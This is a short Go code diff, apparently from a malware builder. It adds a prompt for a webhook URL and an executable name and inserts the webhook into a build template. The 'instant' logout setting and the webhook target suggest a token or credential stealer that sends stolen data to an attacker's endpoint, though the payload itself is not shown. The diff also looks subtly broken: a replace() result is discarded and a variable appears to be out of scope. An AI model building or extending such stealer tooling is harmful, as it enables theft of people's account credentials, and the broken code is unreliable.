@@ -45,14 +45,16 @@ func init() {
 }
 
 func main() {
-	var webhook = ""
+	var webhook string
+	logger.Info("Enter Webhook URL:")
+	fmt.Scanln(&webhook)
 	logger.Info("Enter exe name:")
 	fmt.Scanln(&name)
 	switch {
 	case !strings.Contains(name, ".exe"):
 		name = name + ".exe"
 	}
-	buildPlatform()
+	buildPlatform(webhook)
 }
 
 func loadConfig(file string) Config {
@@ -70,6 +72,7 @@ func loadConfig(file string) Config {
 
 func cfgChanges(data []byte) string {
 	d := string(data)
+	replace(d, "%THISFUCKLOL%1", webhook)
 	// Logout
 	switch cfg.Logout {
 	case "instant":
@@ -133,7 +136,7 @@ func replace(s, old, new string) string {
 	return strings.Replace(s, old, new, -1)
 }
 
-func buildPlatform() {
+func buildPlatform(webhook string) {
 	rand.Seed(time.Now().Unix())
 	for _, platform := range cfg.Platform {
 
